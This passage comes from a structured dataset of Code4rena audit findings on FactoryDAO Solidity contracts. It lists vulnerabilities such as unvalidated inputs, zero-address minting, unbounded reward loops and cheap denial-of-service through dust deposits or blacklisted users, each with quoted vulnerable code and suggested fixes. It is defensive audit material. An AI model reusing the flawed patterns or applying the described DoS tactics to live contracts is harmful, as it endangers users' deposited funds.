      "content": "\nUnlike other common ERC721 implementations, `VoterID` does not distinguish an attempt to transfer a nonexistent token from an unapproved transfer:\n\n[`VoterId#transferFrom`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L198-L201)\n\n```solidity\n    function transferFrom(address from, address to, uint256 tokenId) public {\n        require(isApproved(msg.sender, tokenId), 'Identity: Unapproved transfer');\n        transfer(from, to, tokenId);\n    }\n```\n\nConsider checking that a token exists in `isApproved` to distinguish attempts to transfer nonexistint tokens. (See OpenZeppelin [`ERC721#_isApprovedOrOwner`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d4fb3a89f9d0a39c7ee6f2601d33ffbf30085322/contracts/token/ERC721/ERC721.sol#L232) for an example).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42561",
      "title": "[L-05] Replace inline assembly with `account.code.length`",
      "impact": "LOW",
      "content": "\n`<address>.code.length` can be used in Solidity >= 0.8.0 to access an account's code size and check if it is a contract without inline assembly.\n\n[`VoterID#isContract`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L343-L349)\n\n```solidity\n    function isContract(address account) internal view returns (bool) {\n\n        uint256 size;\n        // solhint-disable-next-line no-inline-assembly\n        assembly { size := extcodesize(account) }\n        return size > 0;\n    }\n```\n\nSuggestion:\n\n```solidity\n    function isContract(address account) internal view returns (bool) {\n        return account.code.length != 0;\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42560",
      "title": "[L-04] Prefer `safeTransfer` and `safeTransferFrom` for ERC20 token transfers",
      "impact": "LOW",
      "content": "\nConsider using OpenZeppelin's [`SafeERC20`](https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#SafeERC20) library to handle edge cases in ERC20 token transfers. This prevents accidentally forgetting to check the return value, like the example in [`MerkleVesting#withdraw`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleVesting.sol#L169-L174).\n\nPotential changes:\n\n*   [`PermissionlessBasicPoolFactory.sol#L144`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L144)\n*   [`PermissionlessBasicPoolFactory.sol#L198`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L198)\n*   [`PermissionlessBasicPoolFactory.sol#L230`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L230)\n*   [`MerkleVesting.sol#L89`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleVesting.sol#L89)\n*   [`MerkleResistor.sol#L121`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleResistor.sol#L121)\n*   [`MerkleResistor.sol#L204`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleResistor.sol#L204)\n*   [`MerkleDropFactory.sol#L77`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleDropFactory.sol#L77)\n*   [`MerkleDropFactory.sol#L107`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleDropFactory.sol#L107)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42559",
      "title": "[L-03] `VoterID` token can be minted to non-ERC721 receivers",
      "impact": "LOW",
      "content": "\n`VoterID` tokens can be minted to non-ERC721 receivers in `VoterID#createIdentityFor`.\n\n[`VoterID#createIdentityFor`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L122-L147)\n\n```solidity\n    function createIdentityFor(address thisOwner, uint thisToken, string memory uri) public override {\n        require(msg.sender == _minter, 'Only minter may create identity');\n        require(owners[thisToken] == address(0), 'Token already exists');\n\n        // for getTokenByIndex below, 0 based index so we do it before incrementing numIdentities\n        allTokens[numIdentities] = thisToken;\n\n        // increment the number of identities\n        numIdentities = numIdentities + 1;\n\n        // two way mapping for enumeration\n        ownershipMapIndexToToken[thisOwner][balances[thisOwner]] = thisToken;\n        ownershipMapTokenToIndex[thisOwner][thisToken] = balances[thisOwner];\n\n        // set owner of new token\n        owners[thisToken] = thisOwner;\n        // increment balances for owner\n        balances[thisOwner] = balances[thisOwner] + 1;\n        uriMap[thisToken] = uri;\n        emit Transfer(address(0), thisOwner, thisToken);\n        emit IdentityCreated(thisOwner, thisToken);\n    }\n```\n\nSuggestion: check `checkOnERC721Received` in `createIdentityFor`. This callback introduces a reentrancy vector, so take care to ensure callers of `createIdentityFor` use a reentrancy guard or follow checks-effects-interactions:\n\n```solidity\n    function createIdentityFor(address thisOwner, uint thisToken, string memory uri) public override {\n        require(msg.sender == _minter, 'Only minter may create identity');\n        require(owners[thisToken] == address(0), 'Token already exists');\n        require(thisOwner != address(0), 'ERC721: mint to the zero address');\n\n        // for getTokenByIndex below, 0 based index so we do it before incrementing numIdentities\n        allTokens[numIdentities] = thisToken;\n\n        // increment the number of identities\n        numIdentities = numIdentities + 1;\n\n        // two way mapping for enumeration\n        ownershipMapIndexToToken[thisOwner][balances[thisOwner]] = thisToken;\n        ownershipMapTokenToIndex[thisOwner][thisToken] = balances[thisOwner];\n\n        // set owner of new token\n        owners[thisToken] = thisOwner;\n        // increment balances for owner\n        balances[thisOwner] = balances[thisOwner] + 1;\n        uriMap[thisToken] = uri;\n\n        require(\n            checkOnERC721Received(address(0), thisOwner, thisToken, \"\"),\n            \"Identity: transfer to non ERC721Receiver implementer\"\n        );\n        emit Transfer(address(0), thisOwner, thisToken);\n        emit IdentityCreated(thisOwner, thisToken);\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42558",
      "title": "[L-02] `VoterID` token can be minted to the zero address",
      "impact": "LOW",
      "content": "\n`VoterID` tokens can be minted to the zero address in `VoterID#createIdentityFor`.\n\n[`VoterID#createIdentityFor`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L122-L147)\n\n```solidity\n    function createIdentityFor(address thisOwner, uint thisToken, string memory uri) public override {\n        require(msg.sender == _minter, 'Only minter may create identity');\n        require(owners[thisToken] == address(0), 'Token already exists');\n\n        // for getTokenByIndex below, 0 based index so we do it before incrementing numIdentities\n        allTokens[numIdentities] = thisToken;\n\n        // increment the number of identities\n        numIdentities = numIdentities + 1;\n\n        // two way mapping for enumeration\n        ownershipMapIndexToToken[thisOwner][balances[thisOwner]] = thisToken;\n        ownershipMapTokenToIndex[thisOwner][thisToken] = balances[thisOwner];\n\n        // set owner of new token\n        owners[thisToken] = thisOwner;\n        // increment balances for owner\n        balances[thisOwner] = balances[thisOwner] + 1;\n        uriMap[thisToken] = uri;\n        emit Transfer(address(0), thisOwner, thisToken);\n        emit IdentityCreated(thisOwner, thisToken);\n    }\n```\n\nSuggestion: validate `thisOwner` in `createIdentityFor`:\n\n```solidity\n    function createIdentityFor(address thisOwner, uint thisToken, string memory uri) public override {\n        require(msg.sender == _minter, 'Only minter may create identity');\n        require(owners[thisToken] == address(0), 'Token already exists');\n        require(thisOwner != address(0), 'ERC721: mint to the zero address');\n\n        // for getTokenByIndex below, 0 based index so we do it before incrementing numIdentities\n        allTokens[numIdentities] = thisToken;\n\n        // increment the number of identities\n        numIdentities = numIdentities + 1;\n\n        // two way mapping for enumeration\n        ownershipMapIndexToToken[thisOwner][balances[thisOwner]] = thisToken;\n        ownershipMapTokenToIndex[thisOwner][thisToken] = balances[thisOwner];\n\n        // set owner of new token\n        owners[thisToken] = thisOwner;\n        // increment balances for owner\n        balances[thisOwner] = balances[thisOwner] + 1;\n        uriMap[thisToken] = uri;\n        emit Transfer(address(0), thisOwner, thisToken);\n        emit IdentityCreated(thisOwner, thisToken);\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42557",
      "title": "[L-01] Missing parameter validations in `SpeedBumpPriceGate#addGate`",
      "impact": "LOW",
      "content": "\nCallers of `addGate` can create price gates with a zero price floor (allowing users to claim free tokens), and zero `priceIncreaseDenominator` (causing price calculation to revert with a divide by zero error).\n\n[`SpeedBumpPriceGate#addGate`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/SpeedBumpPriceGate.sol#L36-L45)\n\n```solidity\n\n    function addGate(uint priceFloor, uint priceDecay, uint priceIncrease, uint priceIncreaseDenominator, address beneficiary) external {\n        // prefix operator increments then evaluates\n        Gate storage gate = gates[++numGates];\n        gate.priceFloor = priceFloor;\n        gate.decayFactor = priceDecay;\n        gate.priceIncreaseFactor = priceIncrease;\n        gate.priceIncreaseDenominator = priceIncreaseDenominator;\n        gate.beneficiary = beneficiary;\n    }\n```\n\nSuggestion: Validate that `priceFloor` and `priceIncreaseDenominator` are nonzero.\n\n```solidity\n\n    function addGate(uint priceFloor, uint priceDecay, uint priceIncrease, uint priceIncreaseDenominator, address beneficiary) external {\n        require(priceFloor != 0, \"Price floor must be nonzero\");\n        require(priceIncreaseDenominator != 0, \"Denominator must be nonzero\");\n        // prefix operator increments then evaluates\n        Gate storage gate = gates[++numGates];\n        gate.priceFloor = priceFloor;\n        gate.decayFactor = priceDecay;\n        gate.priceIncreaseFactor = priceIncrease;\n        gate.priceIncreaseDenominator = priceIncreaseDenominator;\n        gate.beneficiary = beneficiary;\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42556",
      "title": "[M-18] DoS: Attacker may significantly increase the cost of `withdrawExcessRewards()` by creating a significant number of excess receipts",
      "impact": "MEDIUM",
      "content": "_Submitted by AuditsAreUS, also found by 0x52, 0xf15ers, and pedroais_\n\nAn attacker may cause a DoS attack on `withdrawExcessRewards()` by creating a excessive number of `receipts` with minimal value. Each of these receipts will need to be withdrawn before the owner can call `withdrawExcessRewards()`.\n\nThe impact is the owner would have to pay an unbounded amount of gas to `withdraw()` all the accounts and receive their excess funds.\n\n### Proof of Concept\n\n`withdrawExcessRewards()` has the requirement that `totalDepositsWei` for the pool is zero before the owner may call this function as seen on line 245.\n\n```solidity\n        require(pool.totalDepositsWei == 0, 'Cannot withdraw until all deposits are withdrawn');\n```\n\n`pool.totalDepositsWei` is added to each time a user calls `deposit()`. It is increased by the amount the user deposits. There are no restrictions on the amount that may be deposited as a result a user may add 1 wei (or the smallest unit on any currency) which has negligible value.\n\nThe owner can force withdraw these accounts by calling `withdraw()` so long as `block.timestamp > pool.endTime`. They would be required to do this for each account that was created.\n\nThis could be a significant amount of gas costs, especially if the gas price has increased since the attacker originally made the deposits.\n\n### Recommended Mitigation Steps\n\nConsider adding a minimum deposit amount for each pool that can be configured by the pool owner.\n\nAlternatively, allow the owner to call `withdrawExcessRewards()` given some other criteria such as\n\n*   A fix period of time (e.g. 1 month) has passed since the end of the auction; and\n*   90% of the deposits have been withdrawn<br>\n\nThese criteria can be customised as desired by the design team.\n\n**[illuzen (FactoryDAO) confirmed and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/54#issuecomment-1122018541):**\n > Valid, will probably do minimum deposit.\n\n\n\n***\n\n",
      "summary": "\nThe report discusses a bug in the `withdrawExcessRewards()` function that can be exploited by an attacker to cause a denial-of-service (DoS) attack. The attack involves creating a large number of receipts with minimal value, which must be withdrawn before the owner can call `withdrawExcessRewards()`. This would require the owner to pay an excessive amount of gas to withdraw the funds. The report suggests adding a minimum deposit amount for each pool or allowing the owner to call `withdrawExcessRewards()` after a certain period of time has passed and a majority of the deposits have been withdrawn. The team at FactoryDAO has confirmed the bug and plans to implement a minimum deposit requirement.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/54",
      "tags": [],
      "finders": []
    },
    {
      "id": "42555",
      "title": "[M-15] PermissionlessBasicPoolFactory's withdraw can become frozen on zero reward token transfers",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh_\n\nReward tokens that do not allow for zero amount transfers can prevent user pool exit.\n\nNow it is required that all reward amounts be successfully transferred to a receipt owner and the reward token amount isn't checked in the process.\n\nIf withdraw was called at the moment when some reward amount is zero (because either zero time passed or zero slope is set), the withdraw() will revert.\n\nSay once such reward token is there (say with no malicious intent, as it's just a specifics of some valid tokens), user cannot withdraw immediately after deposit as no rewards accrued yet and this token transfer will revert the whole call even if it is one of the many.\n\nAs withdraw() the only way for a user to exit pool, her funds will be frozen within.\n\nIf slope is set to zero for such a token, either maliciously or mistakenly, the withdrawals are impossible for all the users.\n\nAs this is user fund freeze case with external assumptions, setting the severity to medium.\n\n### Proof of Concept\n\nSome ERC20 tokens do not allow for zero amount transfers:\n\n<https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers>\n\nwithdraw() iterates across the set of reward tokens, and requires all transfers to go through:\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L230-L230>\n\n```solidity\nsuccess = success && IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount);\n```\n\nOnce some is not ok, the whole call reverts. As it's the only way for a user to exit the pool, her funds are frozen until non-zero reward is obtained.\n\nIt might never happen as rewardsWeiPerSecondPerToken is allowed to be zero:\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L92-L112>\n\n```solidity\n    function addPool (\n        uint startTime,\n        uint maxDeposit,\n        uint[] memory rewardsWeiPerSecondPerToken,\n        uint programLengthDays,\n        address depositTokenAddress,\n        address excessBeneficiary,\n        address[] memory rewardTokenAddresses,\n        bytes32 ipfsHash,\n        bytes32 name\n    ) external {\n        Pool storage pool = pools[++numPools];\n        pool.id = numPools;\n        pool.rewardsWeiPerSecondPerToken = rewardsWeiPerSecondPerToken;\n        pool.startTime = startTime > block.timestamp ? startTime : block.timestamp;\n        pool.endTime = pool.startTime + (programLengthDays * 1 days);\n        pool.depositToken = depositTokenAddress;\n        pool.excessBeneficiary = excessBeneficiary;\n        pool.taxPerCapita = globalTaxPerCapita;\n\n        require(rewardsWeiPerSecondPerToken.length == rewardTokenAddresses.length, 'Rewards and reward token arrays must be same length');\n```\n\nThis way, when one of the reward tokens doesn't allow for zero transfers:\n\n1.  immediate withdraw after deposit is impossible\n2.  factory allows for creation of malicious or misconfigured pools by adding such a reward token with zero rewardsWeiPerSecondPerToken, making withdraw impossible for all users\n\n### Recommended Mitigation Steps\n\nConsider controlling for zero amounts in reward transfer cycle:\n\n```solidity\n        for (uint i = 0; i < rewards.length; i++) {\n+\t        if (rewards[i] > 0) {\n\t            pool.rewardsWeiClaimed[i] += rewards[i];\n\t            pool.rewardFunding[i] -= rewards[i];\n\t            uint tax = (pool.taxPerCapita * rewards[i]) / 1000;\n\t            uint transferAmount = rewards[i] - tax;\n\t            taxes[poolId][i] += tax;\n\t            success = success && IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount);\n+\t        }\n        }\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L224-L231>\n\n**[illuzen (FactoryDAO) marked as duplicate and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/175#issuecomment-1124518960):**\n > Duplicate of #108 (M-13)\n\n**[Justin Goro (judge) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/175#issuecomment-1155831457):**\n > Unmarking duplicate as FOT and revert-on-zero tokens are different.<br>\n> Consider this issue implicitly acknowledged as sponsor has communicated that badly implemented ERC20 tokens are allowed so long as they respect pool isolation.<br>\n> However, this bug is still a useful boundary condition to consider and so it will not be marked as invalid.<br>\n\n\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue with reward tokens that do not allow for zero amount transfers. This can prevent users from exiting a pool and their funds may be frozen. The severity of this bug is considered medium. The report also includes a proof of concept and recommended mitigation steps. The bug was marked as a duplicate but later unmarked as it is different from the original issue. The sponsor has acknowledged the bug but stated that it is allowed as long as it does not affect pool isolation. However, it is still a useful boundary condition to consider.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/175",
      "tags": [],
      "finders": []
    },
    {
      "id": "42554",
      "title": "[M-10] Unbounded loop in `withdraw()` may cause rewards to be locked in the contract",
      "impact": "MEDIUM",
      "content": "_Submitted by IllIllI_\n\nThe `withdraw()` has an unbounded loop with external calls. If the gas costs of functions change between when deposits are made and when rewards are withdrawn, or if the gas cost of the deposit (`transferFrom()`) is less than the gas cost of the withdrawal (`transfer()`), then the `withdraw()` function may revert due to exceeding the block size gas limit.\n\n### Proof of Concept\n\n`transfer()` is an external call, and `rewards.length` has no maximum size:\n\n```solidity\nFile: contracts/PermissionlessBasicPoolFactory.sol   #1\n\n224           for (uint i = 0; i < rewards.length; i++) {\n225               pool.rewardsWeiClaimed[i] += rewards[i];\n226               pool.rewardFunding[i] -= rewards[i];\n227               uint tax = (pool.taxPerCapita * rewards[i]) / 1000;\n228               uint transferAmount = rewards[i] - tax;\n229               taxes[poolId][i] += tax;\n230               success = success && IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount);\n231           }\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L224-L231>\n\n### Recommended Mitigation Steps\n\nAllow the specification of an offset and length to the `withdraw()` function, so that withdrawals can be broken up into smaller batches if required\n\n**[illuzen (FactoryDAO) confirmed](https://github.com/code-423n4/2022-05-factorydao-findings/issues/122)**\n\n\n\n***\n\n",
      "summary": "\nThe `withdraw()` function in the `contracts/PermissionlessBasicPoolFactory.sol` file has a bug that can cause it to fail if the gas costs of functions change or if the gas cost of the deposit is less than the gas cost of the withdrawal. This can happen if the gas costs change between when deposits are made and when rewards are withdrawn. The bug is caused by an unbounded loop with external calls and the fact that `rewards.length` has no maximum size. To fix this, it is recommended to allow the specification of an offset and length to the `withdraw()` function so that withdrawals can be broken up into smaller batches if needed. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/122",
      "tags": [],
      "finders": []
    },
    {
      "id": "42553",
      "title": "[M-05] `MerkleDropFactory.depositTokens()`  does not require the tree to exist",
      "impact": "MEDIUM",
      "content": "_Submitted by AuditsAreUS_\n\nThe function `depositTokens()` does not first check to ensure that the `treeIndex` exists.\n\nThe impact is that we will attempt to transfer from the zero address to this address. If the transfer succeeds (which it currently does not since we use `IERC20.transferFrom()`)  then the `tokenBalance` of this index will be increased.\n\nThis will be an issue if the contract is updated to use OpenZeppelin's `safeTransferFrom()` function. This update may be necessary to support non-standard ERC20 tokens such as USDT.\n\nIf the update is made then `merkleTree.tokenAddress.safeTransferFrom(msg.sender, address(this), value), \"ERC20 transfer failed\");` will succeed if `merkleTree.tokenAddress = address(0)` since `safeTransferFrom()` succeeds against the zero address.\n\n### Proof of Concept\n\nThere are no checks the `treeIndex` is  valid.\n\n```solidity\n    function depositTokens(uint treeIndex, uint value) public {\n        // storage since we are editing\n        MerkleTree storage merkleTree = merkleTrees[treeIndex];\n\n\n        // bookkeeping to make sure trees don't share tokens\n        merkleTree.tokenBalance += value;\n\n\n        // transfer tokens, if this is a malicious token, then this whole tree is malicious\n        // but it does not effect the other trees\n        require(IERC20(merkleTree.tokenAddress).transferFrom(msg.sender, address(this), value), \"ERC20 transfer failed\");\n        emit TokensDeposited(treeIndex, merkleTree.tokenAddress, value);\n    }\n```\n\n### Recommended Mitigation Steps\n\nConsider adding the check to ensure `0 < treeIndex <= numTrees` in `depositTokens()`.\n\n**[illuzen (FactoryDAO) acknowledged, disagreed with severity and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/59#issuecomment-1122037126):**\n > Technically valid, but this harms no one but the caller, and incorrectly entering arguments is not in scope. \n> \n> File this under code style.\n\n**[illuzen (FactoryDAO) resolved](https://github.com/code-423n4/2022-05-factorydao-findings/issues/59#issuecomment-1145529595):**\n > https://github.com/code-423n4/2022-05-factorydao/pull/3\n\n**[Justin Goro (judge) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/59#issuecomment-1154662299):**\n > Maintaining severity as validating treeIndex isn't out of bounds seems within the appropriate expectations of input validation.\n\n**[HickupHH3 (warden) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/59#issuecomment-1158489785):**\n > FYI, the call will not succeed because OZ's safeTransferFrom() will revert if target isn't an EOA. Solmate on the other hand will not.\n> https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#L110<br>\n> https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L135<br>\n> https://github.com/Rari-Capital/solmate/blob/main/src/utils/SafeTransferLib.sol#L9\n\n**[Justin Goro (judge) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/59#issuecomment-1163853005):**\n > @HickupHH3 - 'target' in openzeppelin's address library refers to the contract making the call. In other words, merkleTree.tokenAddress. So the call will succeed.\n\n\n\n***\n\n",
      "summary": "\nThe function `depositTokens()` in the contract has a bug where it does not check if the `treeIndex` exists before transferring tokens. This can cause an issue if the contract is updated to use a different function, as it may allow for a transfer from the zero address. A proof of concept is provided and it is recommended to add a check to ensure the `treeIndex` is valid. The severity of the bug was debated by project members, but ultimately it was resolved and a fix was implemented.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/59",
      "tags": [],
      "finders": []
    },
    {
      "id": "42552",
      "title": "[M-01] `SpeedBumpPriceGate.sol#addGate()` Lack of input validation may casue div by 0 error",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/SpeedBumpPriceGate.sol#L43>\n\n```solidity\n    gate.priceIncreaseDenominator = priceIncreaseDenominator;\n```\n\nIf `priceIncreaseDenominator` is set to `0` when `addGate()`, in `passThruGate()` the tx will revert at L72 because of div by 0.\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/SpeedBumpPriceGate.sol#L71-L72>\n\n```solidity\n    // multiply by the price increase factor\n    gate.lastPrice = (price * gate.priceIncreaseFactor) / gate.priceIncreaseDenominator;\n```\n\n### Recommendation\n\nConsider adding a check in `addGate()` to require `priceIncreaseDenominator > 0`.\n\n\n**[illuzen (FactoryDAO) acknowledged, disagreed with severity and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/153#issuecomment-1123458383):**\n > This is fine, we just add another gate, redeploy the tree and only harm done is we lost some gas.\n\n**[Justin Goro (judge) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/153#issuecomment-1158431030):**\n > While value is not leaked in this instance, this can cause functionality to be interrupted until fixed. Severity of issue will be maintained.\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a potential issue in the code for a project called FactoryDAO. The code in question is located in the \"SpeedBumpPriceGate.sol\" file and specifically at line 43. The issue is that if a certain variable, called \"priceIncreaseDenominator,\" is set to 0 when a certain function, \"addGate(),\" is called, it can cause a problem later on in the code. At line 72, there is a division by 0, which will cause the transaction to fail and revert. This can interrupt the functionality of the project until it is fixed. The recommendation is to add a check in the \"addGate()\" function to make sure that \"priceIncreaseDenominator\" is always greater than 0. The project team has acknowledged the issue and plans to fix it by redeploying the code. While this issue may not directly leak any value, it can still cause problems and is considered a moderate severity issue. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/153",
      "tags": [],
      "finders": []
    },
    {
      "id": "42551",
      "title": "[H-02] DoS: Blacklisted user may prevent `withdrawExcessRewards()`",
      "impact": "HIGH",
      "content": "_Submitted by AuditsAreUS_\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L242-L256>\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L224-L234>\n\n### Impact\n\nIf one user becomes blacklisted or otherwise cannot be transferred funds in any of the rewards tokens or the deposit token then they will not be able to call `withdraw()` for that token.\n\nThe impact of one user not being able to call `withdraw()` is that the owner will now never be able to call `withdrawExcessRewards()` and therefore lock not only the users rewards and deposit but also and excess rewards attributed to the owner.\n\nThus, one malicious user may deliberately get them selves blacklisted to prevent the owner from claiming the final rewards. Since the attacker may do this with negligible balance in their `deposit()` this attack is very cheap.\n\n### Proof of Concept\n\nIt is possible for `IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount);` to fail for numerous reasons. Such as if a user has been blacklisted (in certain ERC20 tokens) or if a token is paused or there is an attack and the token is stuck.\n\nThis will prevent `withdraw()` from being called.\n\n```solidity\n        for (uint i = 0; i < rewards.length; i++) {\n            pool.rewardsWeiClaimed[i] += rewards[i];\n            pool.rewardFunding[i] -= rewards[i];\n            uint tax = (pool.taxPerCapita * rewards[i]) / 1000;\n            uint transferAmount = rewards[i] - tax;\n            taxes[poolId][i] += tax;\n            success = success && IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount);\n        }\n\n        success = success && IERC20(pool.depositToken).transfer(receipt.owner, receipt.amountDepositedWei);\n        require(success, 'Token transfer failed');\n```\n\nSince line 245 of `withdrawExcessRewards()` requires that `require(pool.totalDepositsWei == 0, 'Cannot withdraw until all deposits are withdrawn');`, if one single user is unable to withdraw then it is impossible for the owner to claim the excess rewards and they are forever stuck in the contract.\n\n### Recommended Mitigation Steps\n\nConsider allowing `withdrawExcessRewards()` to be called after a set period of time after the pool end if most users have withdrawn or some similar criteria.\n\n**[illuzen (FactoryDAO) confirmed, disagreed with severity and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/57#issuecomment-1122022055):**\n > Kind of a duplicate, but I like this angle better. However, malicious token contracts are explicitly considered in the contract as an acceptable risk. Will probably just wrap transfers in a try catch\n\n**[illuzen (FactoryDAO) resolved](https://github.com/code-423n4/2022-05-factorydao-findings/issues/57#issuecomment-1145530196):**\n > https://github.com/code-423n4/2022-05-factorydao/pull/2\n\n**[Justin Goro (judge) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/57#issuecomment-1154659729):**\n > Maintaining severity as deposit tokens at risk.\n\n\n\n***\n\n",
      "summary": "\nThe bug report discusses a potential issue in the code of a contract called PermissionlessBasicPoolFactory. If one user is unable to receive funds in any of the reward tokens or the deposit token, they will not be able to withdraw their funds. This could lead to the owner of the contract being unable to claim any excess rewards. The report suggests implementing a solution to allow the owner to withdraw excess rewards after a certain period of time. The issue has been confirmed and resolved by the team working on the contract. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/57",
      "tags": [],
      "finders": []
    },
    {
      "id": "5417",
      "title": "[L-06] ",
